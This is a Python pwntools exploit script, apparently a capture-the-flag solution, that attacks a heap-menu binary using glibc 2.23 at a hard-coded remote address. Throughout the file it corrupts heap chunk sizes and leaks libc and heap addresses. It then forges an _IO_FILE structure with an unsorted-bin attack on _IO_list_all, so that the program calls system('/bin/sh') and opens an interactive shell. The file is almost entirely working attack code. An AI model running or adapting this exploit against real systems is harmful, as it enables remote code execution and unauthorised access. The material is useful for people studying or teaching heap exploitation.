
'''
huan_attack_pwn
'''

import sys
from pwn import *
# from LibcSearcher import *
# from ctypes import *
context(arch='amd64', os='linux', log_level='debug')
# context(arch='i386' , os='linux', log_level='debug')
binary = './pwn'
libc = './libc-2.23.so'
host, port = "110.40.35.73:33791".split(":")

print(('\033[31;40mremote\033[0m: (y)\n'
    '\033[32;40mprocess\033[0m: (n)'))

if sys.argv[1] == 'y':
    r = remote(host, int(port))
else:
    r = process(binary)

# r = gdb.debug(binary)
# libc = cdll.LoadLibrary(libc)
libc = ELF(libc)
elf = ELF(binary)
# srand = libc.srand(libc.time(0)) #设置种子

default = 1
se      = lambda data                     : r.send(data)
sa      = lambda delim, data              : r.sendafter(delim, data)
sl      = lambda data                     : r.sendline(data)
sla     = lambda delim, data              : r.sendlineafter(delim, data)
rc      = lambda numb=4096                : r.recv(numb)
rl      = lambda time=default             : r.recvline(timeout=time)
ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
uu32    = lambda data                     : u32(data.ljust(4, b'\0'))
uu64    = lambda data                     : u64(data.ljust(8, b'\0'))
lic     = lambda data                     : uu64(ru(data)[-6:])
padding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)
lg      = lambda var_name                 : log.success(f"{var_name} ：0x{globals()[var_name]:x}")
prl     = lambda var_name                 : print(len(var_name))
debug   = lambda command=''               : gdb.attach(r,command)
it      = lambda                          : r.interactive()


def Mea(idx):
	sla(b'>\n',str(idx))

def Add(sz,ct=b'a'):
	Mea(1)
	sla(b'Size :\n',str(sz))
	sla(b'Content :\n',ct)

def Edi(idx,sz,ct):
	Mea(2)
	sla(b'Index :\n',str(idx))
	sla(b'Size :\n',str(sz))
	sla(b'Content :\n',ct)

def show(idx):
	Mea(3)
	sla(b'Index :\n',str(idx))


payload=b'a'*(0x408)+p64(0xbf1)
Add((0x400))

Edi(0,len(payload),payload)
Add(0x1000)

Add(0x400)


show(2)
libc_base = u64(rc(6).ljust(8,b'\0')) - 0x61 - 0x3C4B20 + 16672
main_arena = (0x7ffff7bc4b20 - libc_base) + libc_base
io_list_all=libc_base+libc.symbols['_IO_list_all']
sys_addr=libc_base+libc.symbols['system']

payload=padding(0x400)+p64(0)+p64(0x4b1)
Edi(2,len(payload),payload)
Add(0X600)
Add(0X500)
payload=b'a'*(0x508)+p64(0x4d1)
Edi(4,len(payload),payload)

Add(0x500)


payload=b'a'*(0x508)+p64(0xaf1)
Edi(5,len(payload),payload)

Add(0x1000)

Add(0X500)
Add(0x5b0)
Add(0x500)


payload=b'a'*(0x508)+p64(0xae1)
Edi(9,len(payload),payload)
Add(0x1000)
Add(0x600)
Add(0x521)
Add(0x4a0)
Add(0x500)
Add(0x500)
Add(0x500)
Add(0x500)


show(13)
heapbase = u64(rc(3).ljust(8,b'\0')) - 0x1ba61

lg('main_arena')
lg('heapbase')
lg('libc_base')

p = b'B' * (0x400-0x20)
p += p64(0)
p += p64(0x21)
p += b'B' * 0x10
# fake file
f = b'/bin/sh\x00' # flag overflow arg -> system('/bin/sh')
f += p64(0x61)    # _IO_read_ptr small bin size
#  unsoted bin attack
f += p64(0) # _IO_read_end)
f += p64(io_list_all - 0x10)  # _IO_read_base

#bypass check
# 使fp->_IO_write_base < fp->_IO_write_ptr绕过检查
f += p64(0) # _IO_write_base 
f += p64(1) # _IO_write_ptr

f += p64(0) # _IO_write_end
f += p64(0) # _IO_buf_base
f += p64(0) # _IO_buf_end
f += p64(0) # _IO_save_base
f += p64(0) # _IO_backup_base
f += p64(0) # _IO_save_end
f += p64(0) # *_markers
f += p64(0) # *_chain

f += p32(0) # _fileno
f += p32(0) # _flags2

f += p64(1)  # _old_offset

f += p16(2) # ushort _cur_colum;
f += p8(3)  # char _vtable_offset
f += p8(4)  # char _shrotbuf[1]
f += p32(0) # null for alignment

f += p64(0) # _offset
f += p64(6) # _codecvt
f += p64(0) # _wide_data
f += p64(0) # _freeres_list
f += p64(0) # _freeres_buf

f += p64(0) # __pad5
f += p32(0) # _mode 为了绕过检查,fp->mode <=0 ((addr + 0xc8) <= 0)
f += p32(0) # _unused2

p += f
p += p64(0) * 3 # alignment to vtable
p += p64(heapbase + 0x23010+8) # vtable指向自己
p += p64(0) * 2
p += p64(sys_addr) # _IO_overflow 位置改为system

payload = padding(0x4f8) + p64(0x181)
Add(0x4f8)


Edi(18,len(payload),payload)
Add(0x400)
Edi(19,len(p),p)	

Mea(1)

sla(b'Size :\n',str(0x1000))


it()


